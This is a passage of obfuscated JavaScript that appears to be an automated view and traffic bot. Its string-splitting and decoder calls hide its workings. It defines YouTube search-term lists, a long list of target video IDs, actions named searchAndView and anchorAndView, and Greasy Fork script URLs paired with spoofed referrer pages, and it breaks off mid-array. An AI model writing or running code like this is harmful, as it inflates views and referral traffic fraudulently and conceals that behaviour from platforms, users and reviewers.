searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0xae0 + -0xef4 + 0x41e)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x72 + -0x230c + 0x2388)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + V(0x7) + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms[W(0x18, '$oEF')](-0xa72 + 0x3b8 + -0x6bd * -0x1);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    W(0x15, 'friO') + '4',
    W(0xd, 'friO') + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    W(0x1, 'y#hk') + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    X(0x0) + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    V(0x11) + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    W(0x4, '%1PS') + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    V(0x2) + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    X(0x14) + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + X(0x13) + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + V(0x17) + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + W(0xa, 'qxwv') + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
